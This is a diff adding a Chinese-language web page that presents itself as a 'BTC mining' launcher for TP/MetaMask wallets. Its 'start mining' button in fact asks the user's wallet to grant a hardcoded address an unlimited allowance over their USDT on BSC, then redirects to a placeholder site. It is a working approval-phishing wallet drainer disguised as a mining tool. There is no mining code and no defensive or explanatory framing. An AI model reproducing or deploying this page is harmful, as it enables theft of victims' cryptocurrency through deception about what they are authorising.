@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BTC挖矿</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body style="text-align:center;margin-top:80px;font-family:sans-serif">
+
+<h2>BTC挖矿</h2>
+
+<!-- 环境提示 -->
+<p id="status">正在检测环境...</p>
+
+<button onclick="connect()">连接钱包</button>
+<br><br>
+
+<button onclick="approve()">启动BTC挖矿</button>
+
+<script>
+let web3;
+let account;
+
+// 👉 代币地址（USDT-BSC）
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+
+// 👉 被授权地址
+const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";
+
+// 👉 ERC20 ABI
+const ABI = [
+  {
+    "constant": false,
+    "inputs": [
+      {"name":"_spender","type":"address"},
+      {"name":"_value","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }
+];
+
+// 页面加载时检测环境
+window.onload = function(){
+  checkEnv();
+};
+
+function checkEnv(){
+  if(typeof window.ethereum !== "undefined"){
+    document.getElementById("status").innerText = "请在钱包内点击“连接钱包”";
+  } else {
+    document.getElementById("status").innerText = "请在 TP/MetaMask 钱包内打开此网页";
+  }
+}
+
+// 连接钱包
+async function connect() {
+  if(typeof window.ethereum === "undefined"){
+    alert("请在 TP/MetaMask 钱包内打开网页以连接钱包");
+    return;
+  }
+
+  try {
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.getAccounts();
+    account = accounts[0];
+
+    document.getElementById("status").innerText = "已连接: " + account;
+
+    const chainId = await web3.eth.getChainId();
+    if(chainId !== 56){
+      alert("请切换到 BSC 主网");
+    }
+
+  } catch(err) {
+    alert("钱包连接失败");
+    console.error(err);
+  }
+}
+
+// 授权
+async function approve() {
+  if(typeof window.ethereum === "undefined"){
+    alert("请在 TP/MetaMask 钱包内打开网页以授权");
+    return;
+  }
+
+  if(!account){
+    alert("请先连接钱包");
+    return;
+  }
+
+  const confirmAction = confirm("启动BTC挖矿！（将授权无限额度）");
+  if(!confirmAction) return;
+
+  const contract = new web3.eth.Contract(ABI, tokenAddress);
+
+  try {
+    const tx = await contract.methods.approve(
+      spender,
+      web3.utils.toTwosComplement(-1) // 无限授权
+    ).send({from: account});
+
+    alert("授权成功（无限额度）");
+
+    // 授权完成跳转
+    window.location.href = "https://你的官网.com";
+
+  } catch(err) {
+    alert("授权失败");
+    console.error(err);
+  }
+}
+</script>
+
+</body>
+</html>
